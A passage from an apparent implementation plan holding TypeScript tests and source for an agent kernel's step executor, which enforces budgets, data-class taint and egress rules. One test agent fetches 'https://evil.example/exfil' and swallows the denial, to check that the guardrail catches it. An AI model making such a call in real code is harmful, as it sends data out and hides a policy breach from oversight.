    const done = store.events().filter((e) => e.kind === 'step_done').map((e) => JSON.parse(e.data) as { stepKey: string });
    expect(done.map((d) => d.stepKey)).toEqual([out.stepKey]);
  });
});

/** Calls the model ten times per step at 0.1 each and lets the first refusal propagate; records which call was refused. */
const tenCaller = (usdPerCall = 0.1) => {
  const refusedAt: number[] = [];
  const agent = defineAgent(
    defineContract({
      id: 'ten-caller', version: '1.0.0', description: 'Writes one demo item with many model calls', skills: ['demo-writing'],
      team: 'sourcing', kind: 'llm', consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet],
      capabilities: { llm: { model: 'claude-sonnet-5-5', maxTokens: 50 } }, egress: ['api.anthropic.com'],
      dataClasses: { in: ['P0'], out: ['P0'] }, budget: { usdPerCall, usdPerRun: 0.5 }, timeoutMs: 1_000,
    }),
    async (req, ctx) => {
      for (let i = 1; i <= 10; i++) {
        try {
          await ctx.llm!.complete({ system: 's', prompt: 'p' });
        } catch (e) {
          refusedAt.push(i);
          throw e;
        }
      }
      return [{ id: `${req.prefix}-001`, text: 'written' }];
    },
  );
  return { agent, refusedAt };
};

describe('executeStep: run budgets hold inside a step (G-BUDGET)', () => {
  const run = async (store: Store, t: ReturnType<typeof tenCaller>, extra: Partial<ExecutorDeps> = {}, price = 0.1) =>
    executeStep({ ...depsFor(store, t.agent, [], extra), providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm: pricedLlm(price) } }, 'r', t.agent, seedEnv());

  it('refuses the 6th call of a fresh step at usdPerRun 0.5', async () => {
    const store = Store.open(':memory:');
    const t = tenCaller();
    const out = await run(store, t);
    expect(out).toMatchObject({ kind: 'failed', error: 'budget_exceeded' });
    expect(t.refusedAt).toEqual([6]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.5 + 1e-9);
  });

  it('counts what the agent already spent earlier in the run', async () => {
    const store = Store.open(':memory:');
    store.markRunning({ stepKey: 'earlier', agentId: 'ten-caller', version: '1.0.0', contractHash: 'h', inputEnvelopeId: 'x' });
    store.finishStep({ runId: 'r', stepKey: 'earlier', agentId: 'ten-caller', status: 'done', envelopes: [], cost: { usd: 0.2, inputTokens: 0, outputTokens: 0 } });
    const t = tenCaller();
    await run(store, t);
    expect(t.refusedAt).toEqual([4]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.5 + 1e-9);
  });

  it('holds the policy run cap too', async () => {
    const store = Store.open(':memory:');
    const t = tenCaller();
    await run(store, t, { policy: { ...PRODUCT_POLICY_V1, maxUsdPerRun: 0.3 } });
    expect(t.refusedAt).toEqual([4]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.3 + 1e-9);
  });

  it('reserves usdPerCall: 0.15 calls under usdPerRun 0.5 never exceed 0.5', async () => {
    const store = Store.open(':memory:');
    const t = tenCaller(0.15);
    const out = await run(store, t, {}, 0.15);
    expect(out).toMatchObject({ kind: 'failed', error: 'budget_exceeded' });
    expect(t.refusedAt).toEqual([4]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.5 + 1e-9);
  });

  it('reserves usdPerCall against the policy cap: 0.15 calls under maxUsdPerRun 0.2 never exceed 0.2', async () => {
    const store = Store.open(':memory:');
    const t = tenCaller(0.15);
    await run(store, t, { policy: { ...PRODUCT_POLICY_V1, maxUsdPerRun: 0.2 } }, 0.15);
    expect(t.refusedAt).toEqual([2]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.2 + 1e-9);
  });
});

describe('executeStep: an over-priced call blocks the retry too (G-BUDGET)', () => {
  it('does not retry after a call above usdPerCall, even when the agent swallows it and fails retryably', async () => {
    const store = Store.open(':memory:');
    let calls = 0;
    const a = defineAgent(
      defineContract({
        id: 'swallower', version: '1.0.0', description: 'Writes one demo item with the model', skills: ['demo-writing'], team: 'sourcing', kind: 'llm',
        consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet],
        capabilities: { llm: { model: 'claude-sonnet-5-5', maxTokens: 50 } }, egress: ['api.anthropic.com'],
        dataClasses: { in: ['P0'], out: ['P0'] }, budget: { usdPerCall: 0.15, usdPerRun: 1.0 }, timeoutMs: 1_000,
        retry: { max: 2, on: ['rate_limit'], backoffMs: [10, 10] },
      }),
      async (req, ctx) => {
        calls += 1;
        await ctx.llm!.complete({ system: 's', prompt: 'p' }).catch(() => undefined);
        throw new KernelError('rate_limit', 'pretend');
      },
    );
    const out = await executeStep({ ...depsFor(store, a, []), providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm: pricedLlm(0.4) } }, 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'budget_exceeded', detail: 'G-BUDGET: swallower made a call above usdPerCall earlier in this run' });
    expect(calls).toBe(1);
    expect(store.runCost('r')).toBeCloseTo(0.4, 10);
    expect(store.maxCallCost('r', 'swallower')).toBeCloseTo(0.4, 10);
  });
});

describe('executeStep: data-class taint (G-DATACLASS)', () => {
  const det = { version: '1.0.0', skills: ['demo-tainting'], team: 'sourcing', kind: 'deterministic' as const, budget: { usdPerCall: 0, usdPerRun: 0 }, timeoutMs: 1_000 };
  const emitter = defineAgent(
    defineContract({ ...det, id: 'contact-finder', description: 'Attaches a contact to a demo item', consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet], dataClasses: { in: ['P0'], out: ['P0', 'P1'] }, emits: 'P1' }),
    async (req) => [{ id: `${req.prefix}-001`, text: 'call Ada on 555-0100' }],
  );
  const publicOnly = defineAgent(
    defineContract({ ...det, id: 'public-reader', description: 'Reads public demo items only', consumes: DemoItem, produces: DemoItem, requires: [itemIdSet], guarantees: [itemIdSet], dataClasses: { in: ['P0'], out: ['P0'] } }),
    async (item) => [item],
  );

  it('an agent that emits P1 turns P0 input into P1 output, and a P0-only consumer refuses it at the door', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const out = await executeStep(depsFor(store, emitter, invoked), 'r', emitter, seedEnv());
    expect(out.kind).toBe('done');
    const env = out.kind === 'done' ? out.outputs[0]! : seedEnv();
    expect(env.handoff.dataClass).toBe('P1');
    const next = await executeStep(depsFor(store, emitter, invoked), 'r', publicOnly, env);
    expect(next).toMatchObject({ kind: 'quarantined' });
    expect(next.kind === 'quarantined' && next.verdicts.at(-1)).toMatchObject({ id: 'G-DATACLASS', verdict: 'trip' });
    expect(invoked).toEqual(['contact-finder']);
  });

  const scrubber = defineAgent(
    defineContract({ ...det, id: 'pii-scrubber', description: 'Removes contact details from a demo item', consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet], dataClasses: { in: ['P0', 'P1'], out: ['P0'] }, redactor: true }),
    async (req) => [{ id: `${req.prefix}-001`, text: 'scrubbed' }],
  );

  it('a self-declared redactor that the policy does not allow trips', async () => {
    const store = Store.open(':memory:');
    const out = await executeStep(depsFor(store, scrubber, []), 'r', scrubber, seedEnv());
    expect(out.kind).toBe('quarantined');
    expect(out.kind === 'quarantined' && out.verdicts.at(-1)).toMatchObject({ id: 'G-DATACLASS', verdict: 'trip', detail: 'redactor pii-scrubber is not allowed by policy' });
  });

  it('a redactor the policy allows sets its own class', async () => {
    const store = Store.open(':memory:');
    const policy = { ...PRODUCT_POLICY_V1, redactors: ['pii-scrubber'] };
    const p1 = { ...seedEnv(), handoff: { ...seedEnv().handoff, dataClass: 'P1' as const, pins: { policyHash: policyHash(policy) } } };
    const out = await executeStep(depsFor(store, scrubber, [], { policy, policyHash: policyHash(policy) }), 'r', scrubber, p1);
    expect(out.kind).toBe('done');
    expect(out.kind === 'done' && out.outputs[0]!.handoff.dataClass).toBe('P0');
  });
});

describe('executeStep: broker denials cannot be swallowed', () => {
  it('fails the step with policy_denied when the agent catches a denial and returns normally, without retrying', async () => {
    const sneaky = defineAgent(
      defineContract({
        id: 'sneaky-fetcher', version: '1.0.0', description: 'Fetches demo items from a board', skills: ['demo-fetching'], team: 'sourcing', kind: 'io',
        consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet], capabilities: { http: true },
        egress: ['boards-api.greenhouse.io'], dataClasses: { in: ['P0'], out: ['P0'] }, budget: { usdPerCall: 0, usdPerRun: 0 }, timeoutMs: 1_000,
        retry: { max: 2, on: ['network'], backoffMs: [1, 1] },
      }),
      async (_req, ctx) => {
        try {
          await ctx.http!.getText('https://evil.example/exfil');
        } catch {
          // swallowed on purpose
        }
        return [];
      },
    );
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const out = await executeStep(depsFor(store, sneaky, invoked), 'r', sneaky, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'policy_denied', detail: 'G-EGRESS: sneaky-fetcher may not contact evil.example' });
    expect(invoked).toHaveLength(1);
    expect(store.getStep(out.stepKey)).toMatchObject({ status: 'failed', error_code: 'policy_denied' });
    const ev = store.events('r').find((e) => e.kind === 'step_failed');
    expect(JSON.parse(ev!.data)).toMatchObject({ error: 'policy_denied', denials: ['G-EGRESS: sneaky-fetcher may not contact evil.example'] });
  });
});


describe('executeStep: a timed-out model call is charged its reservation (G-BUDGET)', () => {
  /** Answers `delayMs` after the call, ignoring the abort signal, and charges `usd`. */
  const lateLlm = (usd: number, delayMs: number) => {
    const state = { calls: 0, answered: 0 };
    const llm: LlmProvider = {
      host: 'api.anthropic.com',
      complete: async () => {
        state.calls += 1;
        await new Promise((r) => setTimeout(r, delayMs));
        state.answered += 1;
        return { text: 'ok', inputTokens: 1, outputTokens: 1, usd };
      },
    };
    return { llm, state };
  };
  const slowWriter = defineAgent(
    defineContract({
      id: 'slow-writer', version: '1.0.0', description: 'Writes one demo item with the model', skills: ['demo-writing'], team: 'sourcing', kind: 'llm',
      consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet],
      capabilities: { llm: { model: 'claude-sonnet-5-5', maxTokens: 50 } }, egress: ['api.anthropic.com'],
      dataClasses: { in: ['P0'], out: ['P0'] }, budget: { usdPerCall: 0.15, usdPerRun: 1.0 }, timeoutMs: 20,
      retry: { max: 2, on: ['timeout'], backoffMs: [1, 1] },
    }),
    async (req, ctx) => {
      await ctx.llm!.complete({ system: 's', prompt: 'p' });
      return [{ id: `${req.prefix}-001`, text: 'written' }];
    },
  );
  const policy = { ...PRODUCT_POLICY_V1, maxUsdPerRun: 1.0 };
  const item = (prefix: string): Envelope => {
    const e = seedEnv();
    return { ...e, envelopeId: `seed-${prefix}`, payload: { count: 1, prefix }, handoff: { ...e.handoff, pins: { policyHash: policyHash(policy) } } };
  };
  const settle = () => new Promise((r) => setTimeout(r, 120));

  it('records usdPerCall for every attempt that timed out and ignores the late 0.4 answers', async () => {
    const store = Store.open(':memory:');
    const { llm, state } = lateLlm(0.4, 50);
    const out = await executeStep({ ...depsFor(store, slowWriter, []), policy, policyHash: policyHash(policy), providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm } }, 'r', slowWriter, item('demo'));
    expect(out).toMatchObject({ kind: 'failed', error: 'timeout' });
    expect(state.calls).toBe(3);
    await settle();
    expect(state.answered).toBe(3);
    expect(store.runCost('r')).toBeCloseTo(0.45, 10);
    expect(store.maxCallCost('r', 'slow-writer')).toBeCloseTo(0.15, 10);
  });

  it('never records more than the 1.0 cap over four items', async () => {
    const store = Store.open(':memory:');
    const { llm } = lateLlm(0.4, 50);
    const d = { ...depsFor(store, slowWriter, []), policy, policyHash: policyHash(policy), providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm } };
    for (const p of ['aa', 'bb', 'cc', 'dd']) {
      await executeStep(d, 'r', slowWriter, item(p));
      await settle();
      expect(store.runCost('r')).toBeLessThanOrEqual(1.0 + 1e-9);
    }
    expect(store.runCost('r')).toBeCloseTo(0.9, 10);
  });
});
```

- [ ] **Step 3: Write the implementation**

`src/kernel/memo.ts`:

```ts
import { hashOf, sha256 } from './canonical.js';
import { type AnyContract, contractMajor } from './contract.js';
import type { Envelope } from './envelope.js';

/**
 * Same agent major, same input, same handoff, same policy → same key → the
 * step never runs twice. The input envelope id is deliberately excluded:
 * identical content arriving by two routes is one piece of work.
 */
export function computeStepKey(contract: AnyContract, input: Envelope, policyHash: string): string {
  return hashOf({
    agent: `${contract.id}@${contractMajor(contract)}`,
    inputType: input.type,
    input: input.payload,
    handoff: { guarantees: input.handoff.guarantees, dataClass: input.handoff.dataClass, obligations: input.handoff.obligations },
    policyHash,
  });
}

/** Retry delay with jitter derived from the step key, so retry timing is reproducible too. */
export function backoffDelay(stepKey: string, attempt: number, backoffMs: readonly number[]): number {
  const base = backoffMs[attempt] ?? backoffMs.at(-1) ?? 0;
  return base + (Number.parseInt(sha256(`${stepKey}:${attempt}`).slice(0, 4), 16) % 250);
}
```

`src/kernel/executor.ts`:

```ts
/**
 * Known bounds of the budget accounting (inherent, not bugs):
 * - A call that returns in time and costs more than usdPerCall is charged in full and stops that agent for the rest
 *   of the run, so a run can exceed `policy.maxUsdPerRun` by at most (actual - usdPerCall) once per LLM agent.
 * - A call still in flight when the step times out is recorded at its reservation (the max of usdPerCall and the
 *   largest call seen). What the provider actually bills for it is not visible to the kernel and is bounded only
 *   per call, by the provider's pricing for maxTokens.
 * - Spend of a call in flight when the process itself dies is not recorded; the step re-runs on resume.
 */
import type { AnyAgent } from './agent.js';
import { issueContext } from './broker.js';
import type { Clock } from './clock.js';
import { contractHash } from './contract.js';
import { maxClass } from './data-class.js';
import { type Cost, type Envelope, type GuardrailVerdict, makeEnvelopeId, nextObligations, ZERO_COST } from './envelope.js';
import { classify, type ErrorCode, KernelError } from './errors.js';
import type { GuardrailRegistry } from './guardrails/index.js';
import { backoffDelay, computeStepKey } from './memo.js';
import type { Policy } from './policy.js';
import type { Providers } from './providers.js';
import type { Store } from './store/store.js';

export interface ExecutorDeps {
  readonly store: Store;
  readonly policy: Policy;
  readonly policyHash: string;
  readonly providers: Providers;
  readonly clock: Clock;
  readonly guardrails: GuardrailRegistry;
  readonly contractHashOf: (agentId: string, version: string) => string | undefined;
  readonly sleep: (ms: number) => Promise<void>;
  /** Called right before agent.run; tests count real invocations with it. */
  readonly onInvoke?: (agentId: string, stepKey: string) => void;
}

export type StepOutcome =
  | { readonly kind: 'done'; readonly stepKey: string; readonly outputs: readonly Envelope[]; readonly replayed: boolean }
  | { readonly kind: 'quarantined'; readonly stepKey: string; readonly verdicts: readonly GuardrailVerdict[] }
  | { readonly kind: 'failed'; readonly stepKey: string; readonly error: ErrorCode; readonly detail: string }
  | { readonly kind: 'skipped'; readonly stepKey: string; readonly reason: 'budget' };

/** Rejects when the signal aborts, even if the agent ignores the signal. */
function untilAborted<T>(p: Promise<T>, signal: AbortSignal): Promise<T> {
  if (signal.aborted) return Promise.reject(signal.reason);
  return new Promise<T>((resolve, reject) => {
    const onAbort = () => reject(signal.reason);
    signal.addEventListener('abort', onAbort, { once: true });
    p.then(
      (v) => {
        signal.removeEventListener('abort', onAbort);
        resolve(v);
      },
      (e: unknown) => {
        signal.removeEventListener('abort', onAbort);
        reject(e);
      },
    );
  });
}

const addCost = (a: Cost, b: Cost): Cost => ({
  usd: a.usd + b.usd,
  inputTokens: a.inputTokens + b.inputTokens,
  outputTokens: a.outputTokens + b.outputTokens,
});

/** Decimal dollar amounts carry float noise; a cap is only exceeded beyond it (same rule as the broker). */
const exceedsCap = (value: number, cap: number): boolean => value > cap + 1e-9;

const messageOf = (err: unknown): string => {
  try {
    return err instanceof Error ? err.message : String(err);
  } catch {
    return 'unprintable error';
  }
};

/**
 * Spec §6.1: the same thirteen steps for every agent. Never throws: anything
 * unexpected becomes a failed step, so the supervisor always gets an outcome.
 */
export async function executeStep(deps: ExecutorDeps, runId: string, agent: AnyAgent, input: Envelope): Promise<StepOutcome> {
  const c = agent.contract; // 1 contract lookup (registry.get already threw if unknown)
  const stepKey = computeStepKey(c, input, deps.policyHash); // 5
  /** Every cent paid in this step, summed over all attempts. */
  let stepSpent: Cost = ZERO_COST;
  /** The largest single model call paid in this step, over all attempts. */
  let stepMaxCall = 0;
  const eventOf = (kind: string, data: Record<string, unknown>) => ({ at: deps.clock.now(), kind, data: { agent: c.id, stepKey, ...data }, policyHash: deps.policyHash });
  /** A standalone event, for outcomes that write no step row. */
  const event = (kind: string, data: Record<string, unknown>): void => {
    const e = eventOf(kind, data);
    deps.store.appendEvent(runId, e.at, e.kind, e.data, e.policyHash);
  };
  /** Step row, envelopes, cost and the hash-chained event in one transaction. */
  const finish = (
    status: 'done' | 'failed' | 'quarantined',
    envelopes: readonly Envelope[],
    ev: ReturnType<typeof eventOf>,
    more: { errorCode?: ErrorCode; detail?: string } = {},
  ): void => deps.store.finishStep({ runId, stepKey, agentId: c.id, status, envelopes, cost: stepSpent, maxCallUsd: stepMaxCall, ...more, event: ev });
  const fail = (error: ErrorCode, detail: string): StepOutcome => {
    finish('failed', [], eventOf('step_failed', { error, detail }), { errorCode: error, detail });
    return { kind: 'failed', stepKey, error, detail };
  };

  try {
    const gctx = { contract: c, policy: deps.policy, policyHash: deps.policyHash, contractHashOf: deps.contractHashOf, input };
    const hash = contractHash(c);
    const running = { stepKey, agentId: c.id, version: c.version, contractHash: hash, inputEnvelopeId: input.envelopeId };

    // 2-4 lineage, preconditions and input guardrails. A trip is a property of
    // this envelope, not of the work, so it writes no step row and is never replayed.
    const gin = deps.guardrails.run('in', { ...gctx, side: 'in' });
    if (gin.tripped) {
      event('step_quarantined', { side: 'in', verdict: gin.verdicts.at(-1) });
      return { kind: 'quarantined', stepKey, verdicts: gin.verdicts };
    }

    // 6 replay: a finished step is never executed again
    const prior = deps.store.getStep(stepKey);
    if (prior?.status === 'done') {
      event('step_replayed', { status: 'done' });
      return { kind: 'done', stepKey, outputs: deps.store.envelopesOfStep(stepKey), replayed: true };
    }
    if (prior?.status === 'quarantined') {
      event('step_replayed', { status: 'quarantined' });
      return { kind: 'quarantined', stepKey, verdicts: JSON.parse(prior.detail ?? '[]') as GuardrailVerdict[] };
    }

    // 7 run budget (per agent and per run), counting what this step has already paid.
    // Bounds (see the top of this file): one over-priced call per LLM agent per run can pass the cap by
    // (actual - usdPerCall); a call in flight when the process dies is not recorded and the step re-runs on resume.
    const overBudget = (): boolean =>
      (c.budget.usdPerRun > 0 || c.kind === 'llm') &&
      (deps.store.runCost(runId, c.id) + stepSpent.usd >= c.budget.usdPerRun ||
        deps.store.runCost(runId) + stepSpent.usd >= deps.policy.maxUsdPerRun);
    /** The largest call this agent has been charged in the run, this step included. */
    const maxCallSoFar = (): number => Math.max(deps.store.maxCallCost(runId, c.id), stepMaxCall);
    /** An earlier over-priced call means the agent's per-call price cannot be trusted for the rest of the run. */
    const overCall = (): boolean => exceedsCap(maxCallSoFar(), c.budget.usdPerCall);
    const overCallDetail = `G-BUDGET: ${c.id} made a call above usdPerCall earlier in this run`;
    if (overCall()) {
      event('step_skipped', { reason: 'budget', detail: overCallDetail });
      return { kind: 'skipped', stepKey, reason: 'budget' };
    }
    if (overBudget()) {
      event('step_skipped', { reason: 'budget' });
      return { kind: 'skipped', stepKey, reason: 'budget' };
    }

    // 8-9 capability-scoped context, timeout, bounded retries
    for (let attempt = 0; ; attempt++) {
      if (attempt > 0 && overCall()) return fail('budget_exceeded', overCallDetail);
      if (attempt > 0 && overBudget()) return fail('budget_exceeded', 'G-BUDGET: retry would exceed the run budget');
      deps.store.markRunning(running);
      const signal = AbortSignal.timeout(c.timeoutMs);
      const priorSpend = {
        agentUsd: deps.store.runCost(runId, c.id) + stepSpent.usd,
        runUsd: deps.store.runCost(runId) + stepSpent.usd,
        maxCallUsd: maxCallSoFar(),
      };
      const ctx = issueContext({ contract: c, policy: deps.policy, inputClass: input.handoff.dataClass, providers: deps.providers, clock: deps.clock, signal, priorSpend });
      let result: { ok: true; items: readonly unknown[] } | { ok: false; err: unknown };
      try {
        deps.onInvoke?.(c.id, stepKey);
        const items: unknown = await untilAborted(agent.run(input.payload, ctx), signal);
        if (!Array.isArray(items)) throw new KernelError('invalid_output', 'agent.run must return an array');
        result = { ok: true, items };
      } catch (err) {
        result = { ok: false, err };
      }
      // Read after the abort too: a model call in flight at the timeout has already been charged its reservation.
      stepSpent = addCost(stepSpent, ctx.spent());
      stepMaxCall = Math.max(stepMaxCall, ctx.maxCall());

      // A denial is final even if the agent caught it and carried on: the attempt tried to break policy.
      const denials = ctx.denials();
      const firstDenial = denials[0];
      if (firstDenial !== undefined) {
        finish('failed', [], eventOf('step_failed', { error: 'policy_denied', detail: firstDenial, denials }), { errorCode: 'policy_denied', detail: firstDenial });
        return { kind: 'failed', stepKey, error: 'policy_denied', detail: firstDenial };
      }

      if (!result.ok) {
        const code = classify(result.err);
        if (c.retry.on.includes(code) && attempt < c.retry.max) {
          event('step_retry', { attempt: attempt + 1, error: code });
          await deps.sleep(backoffDelay(stepKey, attempt, c.retry.backoffMs));
          continue;
        }
        return fail(code, messageOf(result.err));
      }

      // 10-11 schema, data class, postconditions on every output
      // Taint only rises: outputs carry the input's class or the contract's `emits`, whichever is higher.
      // Only a redactor the policy allows may set its own (G-DATACLASS checks it).
      const dataClass = c.redactor ? maxClass(c.dataClasses.out) : maxClass([input.handoff.dataClass, c.emits ?? 'P0']);
      const outputs: Envelope[] = [];
      for (const [i, payload] of result.items.entries()) {
        const gout = deps.guardrails.run('out', { ...gctx, side: 'out', output: { payload, dataClass } });
        if (gout.tripped) {
          finish('quarantined', [], eventOf('step_quarantined', { side: 'out', index: i, verdict: gout.verdicts.at(-1) }), { detail: JSON.stringify(gout.verdicts) });
          return { kind: 'quarantined', stepKey, verdicts: gout.verdicts };
        }
        outputs.push({
          envelopeId: makeEnvelopeId(stepKey, i),
          stepKey,
          index: i,
          type: c.produces.id,
          producer: { agentId: c.id, version: c.version, contractHash: hash },
          parents: [input.envelopeId],
          payload,
          handoff: {
            guarantees: c.guarantees.map((g) => g.id).sort(),
            dataClass,
            obligations: nextObligations(input.handoff.obligations, c),
            pins: { policyHash: deps.policyHash },
          },
          guardrails: [...gin.verdicts, ...gout.verdicts],
          cost: i === 0 ? stepSpent : ZERO_COST,
        });
      }

      // 12-13 one transaction: envelopes, step status, cost and the hash-chained event
      finish('done', outputs, eventOf('step_done', { outputs: outputs.length, usd: stepSpent.usd }));
      return { kind: 'done', stepKey, outputs, replayed: false };
    }
  } catch (err) {
    // Unexpected: a store error, a rejecting sleep, a refused finish. Record what we can, then report.
    const detail = messageOf(err);
    let recorded = false;
    try {
      if (deps.store.getStep(stepKey)?.status === 'running') {
        fail('unknown', detail);
        recorded = true;
      }
    } catch {
      // best effort: the store itself may be what failed
    }
    if (!recorded) {
      try {
        event('step_failed', { error: 'unknown', detail });
      } catch {
        // best effort
      }
    }
    return { kind: 'failed', stepKey, error: 'unknown', detail };
  }
}
```

### Task 12: Supervisor and the end-to-end guarantees

The deterministic hub. Routes come from the compiled wiring, order from the queue's total order, state from the tracker's machine. These tests are the kernel's acceptance criteria: determinism, replay, crash-resume, quarantine, breaker, budget.

**Files:**
- Create: `src/kernel/supervisor.ts`
- Create: `src/demo/kernel.ts`
- Test: `tests/kernel/supervisor.test.ts`

**Interfaces:**
- Consumes: `executeStep`, `Breakers`, `Store`, `CompiledPipeline`, `SUPERVISOR_ID`, `contractHash`, `contractShape`.
- Produces: `Tracker`, `SupervisorDeps` (incl. `onInvoke`, `afterStep` test hooks), `RunReport`, `Supervisor` (`start(runId, seeds)`, `resume(runId)`); `demoKernel(options)` returning `{ store, registry, compiled, supervisor, policy }`.
